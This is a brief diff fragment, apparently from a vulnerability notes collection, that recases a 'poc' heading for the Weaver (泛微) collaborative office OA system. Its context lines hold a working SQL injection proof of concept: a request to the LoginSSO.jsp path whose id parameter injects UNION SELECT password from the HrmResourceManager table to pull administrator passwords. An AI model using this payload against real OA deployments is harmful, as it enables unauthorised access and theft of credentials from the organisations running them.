@@ -10,7 +10,7 @@ app="泛微-协同办公OA"
 
 
 
-## poc
+## POC
 
 ```
 /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
